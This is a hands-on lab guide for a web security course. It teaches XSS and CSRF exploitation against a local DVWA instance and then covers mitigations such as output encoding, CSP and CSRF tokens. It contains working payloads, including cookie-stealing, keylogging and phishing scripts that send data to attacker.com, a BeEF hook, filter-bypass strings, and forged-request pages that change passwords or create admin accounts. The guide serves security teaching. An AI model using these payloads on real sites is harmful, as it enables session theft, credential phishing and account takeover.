# LAB-3.2.6: Identifying and Exploiting XSS & CSRF

## Lab Overview

**Course:** BVWS103 – OWASP Top 10 Vulnerabilities & Exploitation Techniques  
**Lab Code:** LAB-3.2.6  
**Lab Title:** Identifying and Exploiting XSS & CSRF  
**Duration:** 3-4 hours  
**Difficulty:** Intermediate  
**Objectives:** Master Cross-Site Scripting (XSS) and Cross-Site Request Forgery (CSRF) exploitation techniques and mitigation strategies.

---

## ⚠️ CRITICAL ETHICAL WARNING

**This lab contains techniques for exploiting client-side vulnerabilities.**

- **ONLY** perform these exercises in the provided lab environment
- **NEVER** test these techniques on systems you don't own or have explicit permission to test
- Unauthorized testing is **ILLEGAL** and unethical
- By proceeding, you agree to use this knowledge responsibly

---

## Lab Introduction

XSS and CSRF are among the most common web application vulnerabilities. They exploit the trust relationship between users and websites, allowing attackers to execute malicious code in victim browsers or perform unauthorized actions.

### Learning Objectives

By completing this lab, you will be able to:
- Identify and exploit Reflected, Stored, and DOM-based XSS
- Understand CSRF attack vectors and exploitation
- Bypass XSS filters and WAF protections
- Implement proper input validation and output encoding
- Configure CSRF tokens and SameSite cookies
- Use security tools for automated XSS/CSRF detection

---

## Lab Setup

### Prerequisites
- Kali Linux or similar penetration testing distribution
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- Basic understanding of HTML, JavaScript, and HTTP

### Environment Setup

```bash
# Start DVWA (if not already running)
sudo docker run -d -p 80:80 vulnerables/web-dvwa

# Or use existing DVWA installation
# Access at: http://localhost/dvwa
# Credentials: admin / password

# Install additional tools
sudo apt install -y xsser beef-xss

# Verify tools
xsser --version
```

---

## Part 1: Cross-Site Scripting (XSS) Fundamentals (45 minutes)

### Exercise 1.1: Understanding XSS Types

**Three Main Types of XSS:**

1. **Reflected XSS** - Payload in URL/request, reflected in response
2. **Stored XSS** - Payload stored in database, executed when viewed
3. **DOM-based XSS** - Payload manipulates DOM in client-side JavaScript

**Task 1:** Understand XSS attack flow

```
Attacker → Crafts malicious URL with XSS payload
       ↓
Victim → Clicks link and visits vulnerable site
       ↓
Server → Reflects payload in response (Reflected XSS)
    OR → Retrieves payload from database (Stored XSS)
       ↓
Browser → Executes malicious JavaScript
       ↓
Attack → Steals cookies, redirects, modifies page, etc.
```

---

### Exercise 1.2: Basic XSS Payloads

**Task 2:** Test basic XSS payloads in DVWA

```html
<!-- Simple alert box -->
<script>alert('XSS')</script>

<!-- Alternative syntax -->
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>

<!-- Image tag XSS -->
<img src=x onerror=alert('XSS')>
<img src=x onerror=alert(1)>

<!-- SVG XSS -->
<svg onload=alert('XSS')>
<svg/onload=alert(1)>

<!-- Body tag XSS -->
<body onload=alert('XSS')>

<!-- Input tag XSS -->
<input onfocus=alert('XSS') autofocus>

<!-- Iframe XSS -->
<iframe src="javascript:alert('XSS')">

<!-- Link XSS -->
<a href="javascript:alert('XSS')">Click me</a>

<!-- Div XSS -->
<div onmouseover=alert('XSS')>Hover me</div>

<!-- Details tag XSS -->
<details open ontoggle=alert('XSS')>

<!-- Marquee XSS -->
<marquee onstart=alert('XSS')>
```

**Testing in DVWA:**

1. Navigate to XSS (Reflected) page
2. Set security level to Low
3. Enter payload in input field
4. Observe if JavaScript executes

---

### Exercise 1.3: Reflected XSS Exploitation

**Task 3:** Exploit reflected XSS vulnerability

```bash
# Access DVWA XSS (Reflected) page
# URL: http://localhost/dvwa/vulnerabilities/xss_r/

# Test basic payload
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>alert('XSS')</script>

# Cookie stealing payload
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>document.location='http://attacker.com/steal.php?c='+document.cookie</script>

# Phishing payload (fake login form)
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>document.body.innerHTML='<h1>Session Expired</h1><form action="http://attacker.com/phish.php"><input name="user" placeholder="Username"><input name="pass" type="password" placeholder="Password"><input type="submit" value="Login"></form>'</script>

# Keylogger payload
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>document.onkeypress=function(e){fetch('http://attacker.com/log.php?key='+e.key)}</script>

# Redirect payload
http://localhost/dvwa/vulnerabilities/xss_r/?name=<script>window.location='http://malicious-site.com'</script>
```

---

### Exercise 1.4: Stored XSS Exploitation

**Task 4:** Exploit stored (persistent) XSS

```bash
# Access DVWA XSS (Stored) page
# This typically affects guestbooks, comments, profiles, etc.

# Basic stored XSS
<script>alert('Stored XSS')</script>

# Persistent cookie stealer
<script>
var img = new Image();
img.src = 'http://attacker.com/steal.php?c=' + document.cookie;
</script>

# BeEF hook (Browser Exploitation Framework)
<script src="http://attacker-ip:3000/hook.js"></script>

# Defacement payload
<script>
document.body.innerHTML = '<h1>Hacked by XSS</h1>';
</script>

# Admin account creation (if victim is admin)
<script>
fetch('/admin/create_user.php', {
    method: 'POST',
    body: 'username=attacker&password=Password123&role=admin'
});
</script>
```

**Impact of Stored XSS:**
- Affects all users who view the infected page
- Persists until removed from database
- More dangerous than reflected XSS
- Can create worms (self-propagating XSS)

---

### Exercise 1.5: DOM-based XSS

**Task 5:** Exploit DOM-based XSS

**Vulnerable Code Example:**

```html
<script>
// Vulnerable: Directly using URL parameter in DOM
var name = location.hash.substring(1);
document.getElementById('welcome').innerHTML = 'Welcome ' + name;
</script>
```

**Exploitation:**

```bash
# URL with DOM XSS payload
http://localhost/vulnerable.html#<img src=x onerror=alert('DOM-XSS')>

# Alternative payloads
http://localhost/vulnerable.html#<script>alert(1)</script>
http://localhost/vulnerable.html#<svg/onload=alert(1)>
```

**Common DOM XSS Sinks:**
- `innerHTML`
- `outerHTML`
- `document.write()`
- `eval()`
- `setTimeout()`
- `setInterval()`

---

## Part 2: Advanced XSS Techniques (45 minutes)

### Exercise 2.1: Bypassing XSS Filters

**Task 6:** Bypass common XSS filters

```html
<!-- Case variation -->
<ScRiPt>alert(1)</ScRiPt>
<IMG SRC=x ONERROR=alert(1)>

<!-- Encoding -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=eval('\x61\x6c\x65\x72\x74\x28\x31\x29')>

<!-- HTML entities -->
<img src=x onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">

<!-- URL encoding -->
<img src=x onerror=%61%6C%65%72%74%28%31%29>

<!-- Double encoding -->
<img src=x onerror=%2561%256C%2565%2572%2574%2528%2531%2529>

<!-- Null bytes -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>

<!-- Comments -->
<script><!--
alert(1)
//--></script>

<!-- Obfuscation -->
<script>eval(atob('YWxlcnQoMSk='))</script>  // alert(1) base64 encoded

<!-- Using different tags -->
<svg><script>alert(1)</script></svg>
<math><script>alert(1)</script></math>

<!-- Event handlers -->
<body onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<keygen onfocus=alert(1) autofocus>
<video><source onerror="alert(1)">

<!-- Without parentheses -->
<script>onerror=alert;throw 1</script>
<script>{onerror=alert}throw 1</script>

<!-- Without quotes -->
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Without script tags -->
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>

<!-- Filter bypass combinations -->
<scr<script>ipt>alert(1)</scr</script>ipt>
<img src=x oneonerrorrror=alert(1)>
```

---

### Exercise 2.2: XSS with BeEF

**Task 7:** Hook browsers with BeEF (Browser Exploitation Framework)

```bash
# Start BeEF
sudo beef-xss

# Access BeEF panel
# URL: http://127.0.0.1:3000/ui/panel
# Default credentials: beef / beef

# Get hook URL
# http://127.0.0.1:3000/hook.js

# Inject hook into vulnerable page
<script src="http://attacker-ip:3000/hook.js"></script>

# Or use shorter payload
<script src="http://attacker-ip:3000/hook.js"></script>

# Once hooked, you can:
# - Get browser information
# - Capture keystrokes
# - Take screenshots
# - Redirect browser
# - Execute commands
# - Social engineering attacks
# - Network reconnaissance
```

---

### Exercise 2.3: XSS Polyglots

**Task 8:** Use XSS polyglots (work in multiple contexts)

```html
<!-- Rsnake's XSS Polyglot -->
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

<!-- Shorter polyglot -->
'"><svg/onload=alert()>

<!-- Another polyglot -->
javascript:"/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html \" onmouseover=/*&lt;svg/*/onload=alert()//>

<!-- Context-agnostic payload -->
';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
```

---

## Part 3: Cross-Site Request Forgery (CSRF) (45 minutes)

### Exercise 3.1: Understanding CSRF

**What is CSRF?**

CSRF tricks authenticated users into performing unwanted actions on a web application where they're currently authenticated.

**CSRF Attack Flow:**

```
1. Victim logs into vulnerable site (gets session cookie)
2. Attacker crafts malicious page with forged request
3. Victim visits attacker's page (while still logged in)
4. Browser automatically sends cookies with forged request
5. Vulnerable site processes request as legitimate
```

**Task 9:** Understand CSRF prerequisites

CSRF requires:
- User must be authenticated
- Application must rely solely on cookies for authentication
- No CSRF tokens or validation
- Predictable request parameters

---

### Exercise 3.2: Basic CSRF Exploitation

**Task 10:** Exploit CSRF vulnerability in DVWA

```html
<!-- CSRF to change password -->
<html>
<body>
<h1>You've won a prize!</h1>
<img src="http://localhost/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change" style="display:none">
</body>
</html>

<!-- CSRF with auto-submit form -->
<html>
<body>
<form action="http://localhost/dvwa/vulnerabilities/csrf/" method="GET" id="csrf-form">
    <input type="hidden" name="password_new" value="hacked">
    <input type="hidden" name="password_conf" value="hacked">
    <input type="hidden" name="Change" value="Change">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>
</body>
</html>

<!-- CSRF with POST request -->
<html>
<body>
<form action="http://localhost/vulnerable/change_email.php" method="POST" id="csrf-form">
    <input type="hidden" name="email" value="attacker@evil.com">
    <input type="hidden" name="submit" value="Update">
</form>
<script>
document.getElementById('csrf-form').submit();
</script>
</body>
</html>

<!-- CSRF with AJAX -->
<html>
<body>
<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost/vulnerable/delete_account.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('confirm=yes');
</script>
</body>
</html>
```

---

### Exercise 3.3: Advanced CSRF Techniques

**Task 11:** Bypass CSRF protections

```html
<!-- Bypass referer check with data URI -->
<iframe src="data:text/html,<script>
var xhr = new XMLHttpRequest();
xhr.open('POST', 'http://localhost/vulnerable/transfer.php', true);
xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
xhr.send('amount=1000&to=attacker');
</script>"></iframe>

<!-- CSRF with JSON -->
<html>
<body>
<script>
fetch('http://localhost/api/update_profile', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/json'
    },
    body: JSON.stringify({
        email: 'attacker@evil.com',
        role: 'admin'
    }),
    credentials: 'include'
});
</script>
</body>
</html>

<!-- CSRF chain with XSS -->
<script>
// First, get CSRF token via XSS
var token = document.querySelector('[name=csrf_token]').value;

// Then, use token in CSRF attack
fetch('/admin/create_user', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded',
        'X-CSRF-Token': token
    },
    body: 'username=attacker&password=Pass123&role=admin',
    credentials: 'include'
});
</script>
```

---

## Part 4: Mitigation and Secure Coding (30 minutes)

### Exercise 4.1: XSS Prevention

**Task 12:** Implement XSS protections

```php
<?php
// VULNERABLE CODE
echo "<p>Welcome " . $_GET['name'] . "</p>";

// SECURE CODE - Output encoding
echo "<p>Welcome " . htmlspecialchars($_GET['name'], ENT_QUOTES, 'UTF-8') . "</p>";

// For JavaScript context
$name = json_encode($_GET['name']);
echo "<script>var name = $name;</script>";

// For URL context
echo "<a href='profile.php?user=" . urlencode($_GET['user']) . "'>Profile</a>";

// Content Security Policy (CSP) header
header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-inline'; object-src 'none'");

// X-XSS-Protection header
header("X-XSS-Protection: 1; mode=block");

// Input validation
function validateInput($input) {
    // Whitelist approach
    if (preg_match('/^[a-zA-Z0-9_]+$/', $input)) {
        return $input;
    }
    return false;
}

// Using templating engines (auto-escaping)
// Twig, Blade, etc. automatically escape output
?>
```

**Content Security Policy Example:**

```html
<meta http-equiv="Content-Security-Policy" content="
    default-src 'self';
    script-src 'self' https://trusted-cdn.com;
    style-src 'self' 'unsafe-inline';
    img-src 'self' data: https:;
    font-src 'self' https://fonts.gstatic.com;
    connect-src 'self' https://api.example.com;
    frame-ancestors 'none';
    base-uri 'self';
    form-action 'self';
">
```

---

### Exercise 4.2: CSRF Prevention

**Task 13:** Implement CSRF protections

```php
<?php
// Generate CSRF token
session_start();
if (empty($_SESSION['csrf_token'])) {
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// Include token in forms
?>
<form method="POST" action="update_profile.php">
    <input type="hidden" name="csrf_token" value="<?php echo $_SESSION['csrf_token']; ?>">
    <input type="email" name="email" required>
    <button type="submit">Update</button>
</form>

<?php
// Validate CSRF token
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    if (!isset($_POST['csrf_token']) || $_POST['csrf_token'] !== $_SESSION['csrf_token']) {
        die('CSRF token validation failed');
    }
    
    // Process request
    // ...
    
    // Regenerate token after use
    $_SESSION['csrf_token'] = bin2hex(random_bytes(32));
}

// SameSite cookie attribute
setcookie('session', $session_id, [
    'expires' => time() + 3600,
    'path' => '/',
    'domain' => 'example.com',
    'secure' => true,
    'httponly' => true,
    'samesite' => 'Strict'  // or 'Lax'
]);

// Double Submit Cookie pattern
setcookie('csrf_token', $csrf_token, [
    'expires' => time() + 3600,
    'path' => '/',
    'secure' => true,
    'samesite' => 'Strict'
]);

// Verify referer header (additional layer)
$referer = $_SERVER['HTTP_REFERER'] ?? '';
if (!str_starts_with($referer, 'https://example.com')) {
    die('Invalid referer');
}
?>
```

---

## Part 5: Automated Testing (30 minutes)

### Exercise 5.1: XSSer Tool

**Task 14:** Automated XSS testing with XSSer

```bash
# Basic XSS scan
xsser --url "http://localhost/dvwa/vulnerabilities/xss_r/?name=XSS"

# Scan with cookies
xsser --url "http://localhost/dvwa/vulnerabilities/xss_r/?name=XSS" --cookie="security=low; PHPSESSID=abc123"

# POST request XSS
xsser --url "http://localhost/form.php" -p "name=XSS&email=test@test.com"

# Automatic payload generation
xsser --url "http://localhost/search.php?q=XSS" --auto

# Use specific payload
xsser --url "http://localhost/search.php?q=XSS" --payload="<script>alert(1)</script>"

# Follow redirects
xsser --url "http://localhost/search.php?q=XSS" --follow

# Verbose output
xsser --url "http://localhost/search.php?q=XSS" -v
```

---

### Exercise 5.2: Burp Suite XSS Detection

**Task 15:** Use Burp Suite for XSS testing

```bash
# Configure browser proxy
# Firefox: Preferences > Network Settings > Manual proxy
# HTTP Proxy: 127.0.0.1, Port: 8080

# In Burp Suite:
# 1. Navigate to target in browser
# 2. Find request in Proxy > HTTP history
# 3. Send to Repeater (Ctrl+R)
# 4. Modify parameter with XSS payload
# 5. Send request and analyze response

# Use Intruder for automated testing:
# 1. Send request to Intruder
# 2. Mark injection points
# 3. Load XSS payload list
# 4. Start attack
# 5. Analyze results for successful XSS
```

---

## Verification and Testing

### Lab Challenge

**Scenario:** Audit a web application for XSS and CSRF vulnerabilities.

**Tasks:**
1. Identify all input points
2. Test for Reflected, Stored, and DOM XSS
3. Test for CSRF on state-changing operations
4. Document all findings
5. Provide proof-of-concept exploits
6. Recommend remediation

---

## Cleanup

```bash
# Stop DVWA
sudo docker stop $(sudo docker ps -q --filter ancestor=vulnerables/web-dvwa)

# Or keep for future practice
echo "Lab completed on $(date)" >> ~/fellowship-labs/lab3.2_completion.txt
```

---

## Submission Requirements

Submit:
1. **Lab Report** with findings and screenshots
2. **Proof-of-Concept** XSS and CSRF exploits
3. **Secure Code Examples** showing mitigations
4. **Reflection** (300-500 words)

---

## Additional Resources

- [OWASP XSS Guide](https://owasp.org/www-community/attacks/xss/)
- [OWASP CSRF Guide](https://owasp.org/www-community/attacks/csrf)
- [PortSwigger XSS](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Filter Evasion Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html)

---

**Lab Version:** 1.0  
**Last Updated:** November 2025  
**Instructor Contact:** resources@aivtic.org.ng

---

**End of Lab Guide**
